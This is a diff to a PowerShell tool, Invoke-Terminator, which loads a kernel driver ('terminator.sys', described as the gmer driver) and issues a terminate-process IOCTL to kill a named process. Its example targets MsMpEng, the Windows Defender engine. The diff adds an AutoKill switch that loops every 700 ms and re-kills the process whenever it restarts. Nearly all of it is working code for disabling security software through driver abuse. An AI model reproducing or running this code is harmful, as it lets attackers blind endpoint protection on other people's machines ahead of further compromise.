@@ -13,6 +13,11 @@ The name of the service that is created in the system
 
 The path where gmer driver is extracted. By default, it is saved in the temp folder of the current user.
 
+.PARAMETER AutoKill
+
+This parameter pertains to processes that are automatically restarted after being terminated.
+By using this parameter, Terminator continuously monitors the status of the specified process and terminates it if it is found to be running. 
+
 .EXAMPLE
 
 Invoke-Terminator -ProcName MsMpEng
@@ -31,8 +36,10 @@ Invoke-Terminator -ProcName MsMpEng
         $ProcName,
 
         [String]
-        $driverPath = [System.IO.Path]::GetTempPath() +  "terminator.sys"
+        $driverPath = [System.IO.Path]::GetTempPath() +  "terminator.sys",
 
+        [Switch]
+        $AutoKill
     )
 
 function Get-ProcAddress {
@@ -97,7 +104,8 @@ function Get-Win32Constants
     $Win32Constants | Add-Member -MemberType NoteProperty -Name GENERIC_READ -Value 0x80000000
     $Win32Constants | Add-Member -MemberType NoteProperty -Name OPEN_EXISTING -Value 0x3
     $Win32Constants | Add-Member -MemberType NoteProperty -Name FILE_ATTRIBUTE_NORMAL -Value 0x80
-
+    $Win32Constants | Add-Member -MemberType NoteProperty -Name OF_READWRITE -Value 0x00000002
+    
     return $Win32Constants
 }
 
@@ -203,7 +211,7 @@ function Main
             Write-Host '[*] There is no process with this name!';
             return
         }
-        Write-Host '[*] Process Id: ', $ProcId
+        Write-Host '[*] Process Id:', $ProcId
     }
     if ((Get-Process -Id $ProcId -ErrorAction Ignore) -eq $null){
            Write-Host '[*] There is no process with this id!'
@@ -292,10 +300,9 @@ function Main
     $Win32Functions.CloseServiceHandle.Invoke($hService)
 
     $hDevice = [IntPtr]::Zero
-    $lpFileName = ("\\.\", $ServiceName) -join ''
+    $lpFileName = ("\\.\{0}" -f $ServiceName)
 
     $hDevice = $Win32Functions.CreateFileA.Invoke($lpFileName, $Win32Constants.GENERIC_WRITE -bor $Win32Constants.GENERIC_READ, 0, [IntPtr]::Zero, $Win32Constants.OPEN_EXISTING, $Win32Constants.FILE_ATTRIBUTE_NORMAL, [IntPtr]::Zero)
-
     if ($hDevice -eq -1) {
         $errorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
         Write-Host "[*] Failed to create file handle. Error code: $errorCode"
@@ -310,16 +317,32 @@ function Main
 
     $Win32Functions.DeviceIoControl.Invoke($hDevice, $INITIALIZE_IOCTL_CODE, $input, $input.Length, $output, $output.Length, [Ref]$BytesReturned, 0)
     [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
-
-    $result =  $Win32Functions.DeviceIoControl.Invoke($hDevice, $TERMINSTE_PROCESS_IOCTL_CODE, $input, $input.Length, $output, $output.Length, [Ref]$BytesReturned, 0)
-    if(!$result){
-        $errorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
-        Write-Host "Failed to DeviceIoControl. Error code: $errorCode"
+    Write-Host '----------------------------'
+    if(!$AutoKill){
+        $result =  $Win32Functions.DeviceIoControl.Invoke($hDevice, $TERMINSTE_PROCESS_IOCTL_CODE, $input, $input.Length, $output, $output.Length, [Ref]$BytesReturned, 0)
+        if(!$result){
+            $errorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
+            Write-Host "Failed to DeviceIoControl. Error code: $errorCode"
+            $Win32Functions.CloseServiceHandle.Invoke($hDevice)
+            return
+        }
+        Write-Host '[*] The process ended successfully'
         $Win32Functions.CloseServiceHandle.Invoke($hDevice)
         return
     }
-    Write-Host '[*] The process ended successfully'
-    $Win32Functions.CloseServiceHandle.Invoke($hDevice)
+  
+    while($true){
+        sleep -Milliseconds 700
+        $ProcId = (Get-Process -Name $ProcName -ErrorAction Ignore).Id
+        if ($ProcId -gt 1){
+            Write-Host ('[+] Process "{0}" was detected' -f $ProcName)
+            Write-Host '  \___Process ID:', $ProcId
+            $input = [BitConverter]::GetBytes($ProcId)
+            $result =  $Win32Functions.DeviceIoControl.Invoke($hDevice, $TERMINSTE_PROCESS_IOCTL_CODE, $input, $input.Length, $output, $output.Length, [Ref]$BytesReturned, 0)
+            Write-Host '  \___Termination status:', $result
+        }
+    }
+ 
 }
     Main | Out-Null
 }
